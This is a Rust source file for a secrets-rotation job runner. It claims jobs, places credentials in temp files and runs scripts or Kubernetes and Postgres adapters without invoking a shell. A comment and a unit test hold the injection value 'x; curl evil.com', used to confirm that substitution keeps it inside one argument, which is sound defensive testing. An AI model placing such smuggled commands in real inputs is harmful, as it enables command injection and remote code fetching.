use std::collections::BTreeMap;
use std::io::Write;
use std::time::Duration;

use anyhow::{Context, Result};
use reqwest::Client;
use serde::Deserialize;

use crate::{config::Config, output::OutputManager};

/// What the server hands over when a job is claimed.
#[derive(Debug, Deserialize)]
struct ClaimedJob {
    id: i64,
    grant: String,
    #[serde(default)]
    params: BTreeMap<String, String>,
    implementation: Implementation,
    #[serde(default)]
    secrets: BTreeMap<String, String>,
    #[serde(default)]
    files: BTreeMap<String, String>,
    /// When set, stdout is the secret's new value and must contain nothing else.
    #[serde(default)]
    capture: bool,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
enum Implementation {
    Adapter {
        adapter: String,
        #[allow(dead_code)]
        config: serde_json::Value,
    },
    Script {
        script: String,
        command: Vec<String>,
    },
}

/// Claim, execute, report, repeat.
///
/// Outbound only: the runner dials the server, so the network it sits in needs no inbound port,
/// no Ingress, and no public endpoint (ADR 0008).
pub async fn run(config: &Config, output: &OutputManager, name: String) -> Result<()> {
    config
        .validate()
        .context("Configuration validation failed")?;
    output.print_info(&format!(
        "Runner '{name}' polling {} — this is the only place a grant executes.",
        config.server.url
    ));

    let client = Client::builder()
        // Longer than the server's long-poll window, so a quiet period is not an error.
        .timeout(Duration::from_secs(60))
        .build()
        .context("Failed to build HTTP client")?;

    loop {
        match claim(&client, config).await {
            Ok(Some(job)) => {
                let id = job.id;
                let grant = job.grant.clone();
                output.print_info(&format!("Running grant '{grant}' (job {id})"));

                let capture = job.capture;
                let (exit_code, out, err) = match execute(job) {
                    Ok(result) => result,
                    // A runner that cannot execute still has to report, or the job hangs until
                    // the server's timeout sweeps it.
                    Err(e) => (127, String::new(), format!("runner could not execute: {e}")),
                };

                // For a capturing rotation, stdout *is* the value: it goes in its own field and
                // never into the output the caller can read. Only stderr is reported as output.
                let (reported, captured) = if capture {
                    (err, Some(out))
                } else {
                    (format!("{out}{err}"), None)
                };

                report(&client, config, id, exit_code, &reported, captured).await?;
                if exit_code == 0 {
                    output.print_success(&format!("Job {id} succeeded"));
                } else {
                    output.print_warning(&format!("Job {id} exited {exit_code}"));
                }
            }
            Ok(None) => {}
            Err(e) => {
                output.print_warning(&format!("Poll failed, retrying: {e}"));
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

async fn claim(client: &Client, config: &Config) -> Result<Option<ClaimedJob>> {
    let response = client
        .get(format!("{}/v1/jobs/claim", config.server.url))
        .bearer_auth(&config.server.token)
        .send()
        .await
        .context("Failed to reach server")?;

    let status = response.status();
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        anyhow::bail!("Server returned {status}: {body}");
    }
    Ok(response.json::<Option<ClaimedJob>>().await.unwrap_or(None))
}

async fn report(
    client: &Client,
    config: &Config,
    id: i64,
    exit_code: i32,
    output: &str,
    captured: Option<String>,
) -> Result<()> {
    let response = client
        .post(format!("{}/v1/jobs/{id}/result", config.server.url))
        .bearer_auth(&config.server.token)
        .json(&serde_json::json!({
            "exit_code": exit_code,
            "output": output,
            "captured": captured,
        }))
        .send()
        .await
        .context("Failed to report result")?;

    let status = response.status();
    if !status.is_success() {
        let body = response.text().await.unwrap_or_default();
        anyhow::bail!("Reporting job {id} failed ({status}): {body}");
    }
    Ok(())
}

/// Materialise the secrets, run the implementation, and collect the outcome.
///
/// Every file lives in one temp directory owned by a guard, so nothing survives an early return
/// or a panic — rather than a cleanup call at the bottom of the happy path, which is exactly the
/// line that gets skipped when an error path is added later.
fn execute(job: ClaimedJob) -> Result<(i32, String, String)> {
    let workspace = tempfile::Builder::new()
        .prefix("sealbox-job-")
        .tempdir()
        .context("Failed to create a working directory")?;

    let mut env: Vec<(String, String)> = Vec::new();
    let mut substitutions: BTreeMap<String, String> = job.params.clone();

    // Environment injection, for values a program reads from the environment.
    for (name, value) in &job.secrets {
        env.push((name.clone(), value.clone()));
    }

    // And the same values as an env-file, for consumers that ingest a batch — one declaration,
    // both forms.
    if !job.secrets.is_empty() {
        let path = workspace.path().join("env");
        let mut rendered = String::new();
        for (name, value) in &job.secrets {
            rendered.push_str(&format!("{name}={value}\n"));
        }
        write_private(&path, rendered.as_bytes())?;
        let path = path.to_string_lossy().into_owned();
        env.push(("SEALBOX_ENVFILE".to_string(), path.clone()));
        substitutions.insert("SEALBOX_ENVFILE".to_string(), path);
    }

    // File-shaped credentials: a kubeconfig, a docker config, an SSH key.
    for (name, value) in &job.files {
        let path = workspace.path().join(name.to_lowercase());
        write_private(&path, value.as_bytes())?;
        let path = path.to_string_lossy().into_owned();
        env.push((name.clone(), path.clone()));
        substitutions.insert(name.clone(), path);
    }

    let argv = match job.implementation {
        Implementation::Script { script, command } => {
            let path = workspace.path().join("implementation");
            write_private(&path, script.as_bytes())?;
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))
                    .context("Failed to make the implementation executable")?;
            }
            substitutions.insert("script".to_string(), path.to_string_lossy().into_owned());
            command
        }
        Implementation::Adapter { adapter, config } => {
            // Adapters return their own outcome: they build a fixed argv and run it themselves,
            // because what makes them safe is that the verb and resource kind are in code here,
            // not in configuration.
            return match adapter.as_str() {
                "kubernetes-secret" => adapters::kubernetes_secret(&config, &substitutions, &env),
                "postgres-role" => adapters::postgres_role(&config, &job.secrets),
                other => anyhow::bail!("unknown adapter '{other}'"),
            };
        }
    };

    let argv: Vec<String> = argv.iter().map(|a| substitute(a, &substitutions)).collect();
    let (program, args) = argv.split_first().context("The grant's command is empty")?;

    // argv, never a shell: a parameter of `x; curl evil.com` is one odd argument.
    let out = std::process::Command::new(program)
        .args(args)
        .envs(env)
        .current_dir(workspace.path())
        .output()
        .with_context(|| format!("Failed to execute {program}"))?;

    Ok((
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    ))
    // `workspace` drops here: every file carrying a secret goes with it.
}

/// Substitute `{name}` placeholders. Whole-token replacement into an argv element — the value is
/// never re-parsed, so nothing inside it can become a separate argument or a shell construct.
fn substitute(arg: &str, values: &BTreeMap<String, String>) -> String {
    let mut result = arg.to_string();
    for (name, value) in values {
        result = result.replace(&format!("{{{name}}}"), value);
    }
    result
}

fn write_private(path: &std::path::Path, contents: &[u8]) -> Result<()> {
    let mut file = std::fs::File::create(path)
        .with_context(|| format!("Failed to create {}", path.display()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        file.set_permissions(std::fs::Permissions::from_mode(0o600))
            .context("Failed to restrict permissions")?;
    }
    file.write_all(contents)
        .with_context(|| format!("Failed to write {}", path.display()))?;
    Ok(())
}

/// The built-in implementations.
///
/// Each builds its argv here, in code. Configuration supplies values that become arguments —
/// a namespace, a database — and never the verb or the resource kind. That is the whole
/// difference from a script: a script holding a kubeconfig could `delete ns prod`; the
/// `kubernetes-secret` adapter can write one Secret and nothing else (ADR 0007).
mod adapters {
    use anyhow::{Context, Result};
    use sealbox_server::repo::adapter::{KubernetesSecretConfig, PostgresRoleConfig};
    use std::collections::BTreeMap;
    use std::io::Write;
    use std::process::{Command, Stdio};

    /// Write the grant's declared secrets into one named Secret, using the runner's own
    /// ServiceAccount — which `kubectl` picks up on its own inside a cluster.
    pub fn kubernetes_secret(
        config: &serde_json::Value,
        substitutions: &BTreeMap<String, String>,
        env: &[(String, String)],
    ) -> Result<(i32, String, String)> {
        let config: KubernetesSecretConfig = serde_json::from_value(config.clone())
            .context("kubernetes-secret configuration is invalid")?;

        let env_file = substitutions
            .get("SEALBOX_ENVFILE")
            .context("kubernetes-secret needs the grant to declare at least one secret")?;

        // Render, then apply. `create --dry-run=client -o yaml | apply -f -` replaces the
        // Secret's contents, so removing a secret from the grant removes it from the cluster —
        // a merge would leave the old key behind and the removal would appear to have worked.
        //
        // The pipe is a real pipe between two processes, not a shell: nothing here is parsed
        // by anything that could find a metacharacter in it.
        let rendered = Command::new("kubectl")
            .args([
                "create",
                "secret",
                "generic",
                &config.name,
                "--namespace",
                &config.namespace,
                "--from-env-file",
                env_file,
                "--dry-run=client",
                "-o",
                "yaml",
            ])
            .envs(env.iter().cloned())
            .output()
            .context(
                "failed to run `kubectl` — the runner's image must carry it, since this adapter \
                 uses the runner's own ServiceAccount",
            )?;

        if !rendered.status.success() {
            return Ok((
                rendered.status.code().unwrap_or(-1),
                String::new(),
                String::from_utf8_lossy(&rendered.stderr).into_owned(),
            ));
        }

        let mut apply = Command::new("kubectl")
            .args(["apply", "--namespace", &config.namespace, "-f", "-"])
            .envs(env.iter().cloned())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .context("failed to run `kubectl apply`")?;
        apply
            .stdin
            .as_mut()
            .context("kubectl apply took no stdin")?
            .write_all(&rendered.stdout)
            .context("failed to send the manifest to kubectl")?;
        let out = apply.wait_with_output().context("kubectl apply failed")?;

        Ok((
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        ))
    }

    /// Create a role with the new value as its password and emit a connection URL.
    ///
    /// Creates rather than alters (ADR 0011): changing an existing role's password has a window
    /// in which the database and the cluster disagree, and every request in it fails. The old
    /// role is left for a later grant to drop, after something has verified the new one works.
    pub fn postgres_role(
        config: &serde_json::Value,
        secrets: &BTreeMap<String, String>,
    ) -> Result<(i32, String, String)> {
        let config: PostgresRoleConfig = serde_json::from_value(config.clone())
            .context("postgres-role configuration is invalid")?;
        let password = secrets
            .get("SEALBOX_NEW")
            .context("postgres-role is a rotation adapter: run it with `rotate`, not `run`")?;
        let admin = secrets
            .get("admin")
            .context("postgres-role needs the grant to declare an `admin` connection URL")?;

        let existing = psql(
            admin,
            &[
                "-tAc",
                &format!(
                    "SELECT rolname FROM pg_roles WHERE rolname LIKE '{}\\_%'",
                    config.role_prefix
                ),
            ],
        )?;
        let role = next_role_name(&config.role_prefix, &existing);

        // The password reaches psql as a variable and is quoted by psql itself (`:'pw'`), so it
        // is never concatenated into SQL. The privileges are constants validated at approval.
        let privileges = config.privileges.join(", ");
        let sql = format!(
            "CREATE ROLE {role} LOGIN PASSWORD :'pw'; \
             GRANT CONNECT ON DATABASE {db} TO {role}; \
             GRANT USAGE ON SCHEMA {schema} TO {role}; \
             GRANT {privileges} ON ALL TABLES IN SCHEMA {schema} TO {role};",
            db = config.database,
            schema = config.schema,
        );
        let stderr = psql_write(admin, password, &sql)?;

        let mut url = reqwest::Url::parse(&format!(
            "postgresql://{}:{}/{}",
            config.host, config.port, config.database
        ))
        .context("could not build a connection URL")?;
        url.set_username(&role)
            .ok()
            .context("could not set the role on the URL")?;
        // `Url` percent-encodes the password, so whatever characters it contains, the URL parses.
        url.set_password(Some(password))
            .ok()
            .context("could not set the password on the URL")?;

        // stdout is the value and nothing else: this adapter is meant for `rotate --from-output`.
        Ok((0, url.to_string(), stderr))
    }

    /// `<prefix>_<n>`, picking the next serial. A prefix rather than a configured name, so the
    /// grant stays stable across rotations and can be approved once.
    pub fn next_role_name(prefix: &str, existing: &str) -> String {
        let highest = existing
            .lines()
            .filter_map(|line| line.trim().strip_prefix(&format!("{prefix}_")))
            .filter_map(|serial| serial.parse::<u32>().ok())
            .max()
            .unwrap_or(0);
        format!("{prefix}_{}", highest + 1)
    }

    fn psql(connection: &str, args: &[&str]) -> Result<String> {
        let out = Command::new("psql")
            .arg(connection)
            .args(args)
            .output()
            .context("failed to run `psql` — the runner's image must carry it")?;
        if !out.status.success() {
            anyhow::bail!("psql failed: {}", String::from_utf8_lossy(&out.stderr));
        }
        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
    }

    fn psql_write(connection: &str, password: &str, sql: &str) -> Result<String> {
        let out = Command::new("psql")
            .arg(connection)
            .args(["-v", &format!("pw={password}"), "-c", sql])
            .output()
            .context("failed to run `psql` — the runner's image must carry it")?;
        if !out.status.success() {
            anyhow::bail!("psql failed: {}", String::from_utf8_lossy(&out.stderr));
        }
        Ok(String::from_utf8_lossy(&out.stderr).into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn role_names_take_the_next_serial() {
        use super::adapters::next_role_name;

        // Nothing yet.
        assert_eq!(next_role_name("app", ""), "app_1");
        // Picks the highest, not the count — a gap must not cause a reuse.
        assert_eq!(next_role_name("app", "app_1\napp_3\n"), "app_4");
        // Unrelated roles are ignored, including ones that merely start the same way.
        assert_eq!(
            next_role_name("app", "app_1\nappserver_9\npostgres\n"),
            "app_2"
        );
    }

    #[test]
    fn a_password_is_percent_encoded_into_the_url() {
        // A generated password is alphanumeric, but a captured or supplied one need not be, and
        // a URL that does not parse is a credential that silently does not work.
        let mut url = reqwest::Url::parse("postgresql://db.internal:5432/app").unwrap();
        url.set_username("app_2").unwrap();
        url.set_password(Some("p@ss:w/rd?#")).unwrap();

        let rendered = url.to_string();
        assert!(
            !rendered.contains("p@ss:w/rd?#"),
            "raw password must not survive"
        );
        let reparsed = reqwest::Url::parse(&rendered).unwrap();
        assert_eq!(reparsed.password().unwrap(), "p%40ss%3Aw%2Frd%3F%23");
        assert_eq!(reparsed.username(), "app_2");
    }

    #[test]
    fn substitution_is_whole_token_and_never_reparsed() {
        let mut values = BTreeMap::new();
        values.insert("ns".to_string(), "x; curl evil.com".to_string());
        values.insert("path".to_string(), "/tmp/a b".to_string());

        // The dangerous value lands in one argument and stays there.
        assert_eq!(substitute("{ns}", &values), "x; curl evil.com");
        assert_eq!(substitute("--ns={ns}", &values), "--ns=x; curl evil.com");
        // Spaces do not split anything either, because nothing re-parses the result.
        assert_eq!(substitute("{path}", &values), "/tmp/a b");
        // An unknown placeholder is left alone rather than becoming empty.
        assert_eq!(substitute("{unknown}", &values), "{unknown}");
    }
}
